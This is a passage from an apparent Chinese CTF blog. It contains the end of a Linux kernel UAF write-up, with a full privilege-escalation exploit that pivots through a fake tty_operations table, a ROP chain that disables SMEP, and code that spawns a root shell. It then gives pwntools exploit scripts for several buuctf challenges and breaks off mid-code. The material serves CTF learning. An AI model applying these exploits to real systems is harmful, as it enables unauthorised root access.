<span class="title">idx</span>);</span></span><br><span class="line"><span class="type">int</span>  (*install)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line"><span class="type">void</span> (*remove)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line"><span class="type">int</span>  (*open)(<span class="keyword">struct</span> tty_struct * tty, <span class="keyword">struct</span> file * filp);</span><br><span class="line"><span class="type">void</span> (*close)(<span class="keyword">struct</span> tty_struct * tty, <span class="keyword">struct</span> file * filp);</span><br><span class="line"><span class="type">void</span> (*shutdown)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line"><span class="type">void</span> (*cleanup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line"><span class="type">int</span>  (*write)(<span class="keyword">struct</span> tty_struct * tty,</span><br><span class="line">      <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *buf, <span class="type">int</span> count);</span><br><span class="line"><span class="type">int</span>  (*put_char)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">unsigned</span> <span class="type">char</span> ch);</span><br><span class="line"><span class="type">void</span> (*flush_chars)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line"><span class="type">int</span>  (*write_room)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line"><span class="type">int</span>  (*chars_in_buffer)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line"><span class="type">int</span>  (*ioctl)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line"><span class="type">long</span> (*compat_ioctl)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">     <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line"><span class="type">void</span> (*set_termios)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> ktermios * old);</span><br><span class="line"><span class="type">void</span> (*throttle)(<span class="keyword">struct</span> tty_struct * tty);</span><br><span class="line"><span class="type">void</span> (*unthrottle)(<span class="keyword">struct</span> tty_struct * tty);</span><br><span class="line"><span class="type">void</span> (*stop)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line"><span class="type">void</span> (*start)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line"><span class="type">void</span> (*hangup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line"><span class="type">int</span> (*break_ctl)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> state);</span><br><span class="line"><span class="type">void</span> (*flush_buffer)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line"><span class="type">void</span> (*set_ldisc)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line"><span class="type">void</span> (*wait_until_sent)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> timeout);</span><br><span class="line"><span class="type">void</span> (*send_xchar)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">char</span> ch);</span><br><span class="line"><span class="type">int</span> (*tiocmget)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line"><span class="type">int</span> (*tiocmset)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="built_in">set</span>, <span class="type">unsigned</span> <span class="type">int</span> clear);</span><br><span class="line"><span class="type">int</span> (*resize)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> winsize *ws);</span><br><span class="line"><span class="type">int</span> (*set_termiox)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> termiox *tnew);</span><br><span class="line"><span class="type">int</span> (*get_icount)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line"><span class="keyword">struct</span> serial_icounter_struct *icount);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_CONSOLE_POLL</span></span><br><span class="line"><span class="type">int</span> (*poll_init)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line, <span class="type">char</span> *options);</span><br><span class="line"><span class="type">int</span> (*poll_get_char)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line);</span><br><span class="line"><span class="type">void</span> (*poll_put_char)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line, <span class="type">char</span> ch);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">proc_fops</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到其中write的函数指针应该在索引为7的位置。因此我们将这里修改为mov rsp, rax的指针。这里，原资料巧妙构造了tty_operations的结构使得其能成功触发ROP。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> fake_op[<span class="number">0x30</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++)</span><br><span class="line">    fake_op[i] = MOV_RSP_RAX_DEC_EBX_RET;</span><br><span class="line"></span><br><span class="line">fake_op[<span class="number">0</span>] = POP_RAX_RET;</span><br><span class="line">fake_op[<span class="number">1</span>] = rop;</span><br></pre></td></tr></table></figure><p>首先，使用write函数触发栈迁移，此时栈应该在fake_op的头部位置。之后ret到pop rax ; ret的gadget，将rax赋值为事先构造好的ROP链，然后ret。<strong>注意：ret后面又是一个mov rsp, rax，这就使得rsp自然地被迁移到了ROP上。</strong>至此，一切顺理成章地完成了。</p><p>笔者无比欣喜地开始测试，想看到那个梦寐以求的’#’出现，但是kernel却甩给我一堆报错信息，1s之内难以截屏，但大致说的是：unable to handle kernel paging request。</p><p><img src="https://img-blog.csdnimg.cn/b837e5b8df6446df82863e6bdbffe367.png"><br><img src="https://img-blog.csdnimg.cn/abb50a40f0a54b39a41c979de4c01ad9.png"><br>又回去用git库中带的exp试了一下，没有问题啊。什么问题呢？终端在最后显示的信息中，有笔者写入到程序中的标志信息，即已经进入了调用system(“&#x2F;bin&#x2F;sh”)的函数，但是还是报错了，报的错还不一样。。。。。。<br>给自己代码稍微该了下。好，现在报错是一样的且不会重启了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[+] Congratulations! root got......</span><br><span class="line">[    4.253787] traps: uaf.o[90] general protection ip:4110a2 sp:7ffd42a4da38 error:0 in uaf.o[401000+96000]</span><br><span class="line">[    4.255947] device release</span><br><span class="line">[    4.256551] bad magic number for tty struct (5:2) in tty_release</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure><p>注意到成功的elf文件中，退出root后也会产生同样的错误。</p><p><img src="https://img-blog.csdnimg.cn/18cca2dc76834b038295b7d5cf8c2565.png"><br>更奇妙的是，当我在此基础上添加几个printf时，居然又出现了kernel panic错误。推测是编译器问题，暂时无法解决(ノへ￣、)，但是原理算是全部清楚了。</p><p>最终exp：（能够执行到shell函数但无法提权）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> commit_creds = <span class="number">0xffffffff810a1420</span>, prepare_kernel_cred = <span class="number">0xffffffff810a1810</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> movcr4rdi_poprbp_ret 0xffffffff81004d80<span class="comment">// need to move 0x6f0 to cr4</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> swapgs_poprbp_ret 0xffffffff81063694</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> iretq 0xffffffff8181a797</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> poprdi_ret 0xffffffff810d238d</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> movrsprax_decebx_ret 0xffffffff8181bfc5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> poprax_ret 0xffffffff8100ce6e</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> fake_tty_operations[<span class="number">30</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> length)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">rise_cred</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">shell</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\n\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// this is a universal function to print binary data from a char* array</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> length)</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;---------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Address info starting in %p:\n&quot;</span>, buf);</span><br><span class="line"><span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> output_buffer[<span class="number">80</span>];</span><br><span class="line"><span class="built_in">memset</span>(output_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">80</span>);</span><br><span class="line"><span class="built_in">memset</span>(output_buffer, <span class="string">&#x27; &#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;(length % <span class="number">16</span> == <span class="number">0</span> ? length / <span class="number">16</span> : length / <span class="number">16</span> + <span class="number">1</span>); i++)&#123;</span><br><span class="line"><span class="type">char</span> temp_buffer[<span class="number">0x10</span>];</span><br><span class="line"><span class="built_in">memset</span>(temp_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(temp_buffer, <span class="string">&quot;%#5x&quot;</span>, index);</span><br><span class="line"><span class="built_in">strcpy</span>(output_buffer, temp_buffer);</span><br><span class="line">output_buffer[<span class="number">5</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">output_buffer[<span class="number">6</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">output_buffer[<span class="number">7</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;<span class="number">16</span>; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(index+j &gt;= length)</span><br><span class="line"><span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;   &quot;</span>);</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;%02x &quot;</span>, ((<span class="type">int</span>)buf[index+j]) &amp; <span class="number">0xFF</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">isprint</span>(buf[index+j]))</span><br><span class="line">output_buffer[<span class="number">58</span>+j] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">output_buffer[<span class="number">58</span>+j] = buf[index+j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">output_buffer[<span class="number">55</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">output_buffer[<span class="number">56</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">output_buffer[<span class="number">57</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, output_buffer);</span><br><span class="line"><span class="built_in">memset</span>(output_buffer+<span class="number">58</span>, <span class="string">&#x27;\0&#x27;</span>, <span class="number">16</span>);</span><br><span class="line">index += <span class="number">16</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;---------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">rise_cred</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="comment">// define two function pointer</span></span><br><span class="line"><span class="comment">// printf(&quot;\033[32m\033[1m[+] Ready to execute commit_creds(prepare_kernel_cred(NULL))......\033[0m\n&quot;);</span></span><br><span class="line"><span class="type">void</span>* (*prepare_kernel_credp)(<span class="type">void</span>*) = prepare_kernel_cred;</span><br><span class="line"><span class="type">int</span> (*commit_credsp)(<span class="type">void</span>*) = commit_creds;</span><br><span class="line">(*commit_credsp)((*prepare_kernel_credp)(<span class="literal">NULL</span>));</span><br><span class="line"><span class="comment">// printf(&quot;\033[32m\033[1m[+] commit_creds(prepare_kernel_cred(NULL)) executed.\033[0m\n&quot;);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">shell</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="comment">// if(getuid())&#123;</span></span><br><span class="line"><span class="comment">// printf(&quot;\033[31m\033[1m[x] Error: Failed to get root, exiting......\n\033[0m&quot;);</span></span><br><span class="line"><span class="comment">// exit(1);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="comment">// printf(&quot;\033[32m\033[1m[+] Congratulations! root got......\033[0m\n&quot;);</span></span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">saveStatus();</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> rop[<span class="number">0x20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> idx = <span class="number">0</span>;</span><br><span class="line">rop[idx++] = poprdi_ret;<span class="comment">// mov rdi, 6f0h</span></span><br><span class="line">rop[idx++] = <span class="number">0x6f0</span>;</span><br><span class="line">rop[idx++] = movcr4rdi_poprbp_ret;<span class="comment">// close SMEP</span></span><br><span class="line">rop[idx++] = <span class="number">0</span>;<span class="comment">// for pop rbp</span></span><br><span class="line">rop[idx++] = rise_cred;</span><br><span class="line">rop[idx++] = swapgs_poprbp_ret;<span class="comment">// ready to return to user mode</span></span><br><span class="line">rop[idx++] = <span class="number">0</span>;</span><br><span class="line">rop[idx++] = <span class="number">0xffffffff814e35ef</span>;</span><br><span class="line">rop[idx++] = shell;</span><br><span class="line">rop[idx++] = user_cs;</span><br><span class="line">rop[idx++] = user_rflags;</span><br><span class="line">rop[idx++] = user_sp;</span><br><span class="line">rop[idx++] = user_ss;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> fake_tty_struct[<span class="number">0x20</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x10</span>; i++)</span><br><span class="line">fake_tty_operations[i] = movrsprax_decebx_ret;</span><br><span class="line">fake_tty_operations[<span class="number">0</span>] = poprax_ret;</span><br><span class="line">fake_tty_operations[<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)rop;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> f1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line"><span class="type">int</span> f2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line">ioctl(f1, <span class="number">0x10001</span>, <span class="number">0x2e0</span>);</span><br><span class="line">close(f1);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> f3 = open(<span class="string">&quot;/dev/ptmx&quot;</span>, <span class="number">2</span>|O_NOCTTY);</span><br><span class="line"></span><br><span class="line">read(f2, fake_tty_struct, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">fake_tty_struct[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)fake_tty_operations;<span class="comment">// change the tty_operations pointer to our fake pointer</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">write(f2, fake_tty_struct, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">write(f3, buf, <span class="number">8</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-pwn write-ups (2)</title>
      <link href="/2023/02/28/buuctf-pwn-write-ups-2/"/>
      <url>/2023/02/28/buuctf-pwn-write-ups-2/</url>
      
        <content type="html"><![CDATA[<p>重点讲解第26题：babyheap的解题方法。</p><h1 id="buu017-not-the-same-3dsctf-2016"><a href="#buu017-not-the-same-3dsctf-2016" class="headerlink" title="buu017-not_the_same_3dsctf_2016"></a>buu017-not_the_same_3dsctf_2016</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25850</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x2d</span>) + p32(elf.symbols[<span class="string">&#x27;get_secret&#x27;</span>]) + p32(elf.symbols[<span class="string">&#x27;write&#x27;</span>]) + p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">1</span>) + p32(<span class="number">0x80ECA2D</span>) + p32(<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu018-ciscn-2019-n-5"><a href="#buu018-ciscn-2019-n-5" class="headerlink" title="buu018-ciscn_2019_n_5"></a>buu018-ciscn_2019_n_5</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29724</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">poprdi_ret = <span class="number">0x400713</span></span><br><span class="line">ret = <span class="number">0x4004c9</span></span><br><span class="line">bss = <span class="number">0x601080</span></span><br><span class="line">leave = <span class="number">0x4006a9</span></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;tell me your name&#x27;</span>, asm(shellcraft.amd64.sh()))</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x20</span>) + p64(bss) + p64(bss)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;What do you want to say to me?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu019-others-shellcode"><a href="#buu019-others-shellcode" class="headerlink" title="buu019-others_shellcode"></a>buu019-others_shellcode</h1><p>连上就行</p><h1 id="buu020-ciscn-2019-ne-5"><a href="#buu020-ciscn-2019-ne-5" class="headerlink" title="buu020-ciscn_2019_ne_5"></a>buu020-ciscn_2019_ne_5</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25761</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Please input admin password:&#x27;</span>, <span class="string">b&#x27;administrator&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">76</span>) + p32(elf.plt[<span class="string">&#x27;puts&#x27;</span>]) + p32(elf.symbols[<span class="string">&#x27;main&#x27;</span>]) + p32(elf.got[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;0.Exit\n:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Please input new log info:&#x27;</span>, payload)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;0.Exit\n:&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(p32(elf.got[<span class="string">&#x27;printf&#x27;</span>]) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">printf = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;printf&#x27;</span>, printf)</span><br><span class="line">base = printf - libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line">binsh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Please input admin password:&#x27;</span>, <span class="string">b&#x27;administrator&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">76</span>) + p32(elf.plt[<span class="string">&#x27;system&#x27;</span>]) + p32(<span class="number">0xdeadbeef</span>) + p32(binsh)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;0.Exit\n:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Please input new log info:&#x27;</span>, payload)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;0.Exit\n:&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu021-铁人三项-第五赛区-2018-rop"><a href="#buu021-铁人三项-第五赛区-2018-rop" class="headerlink" title="buu021-铁人三项(第五赛区)_2018_rop"></a>buu021-铁人三项(第五赛区)_2018_rop</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 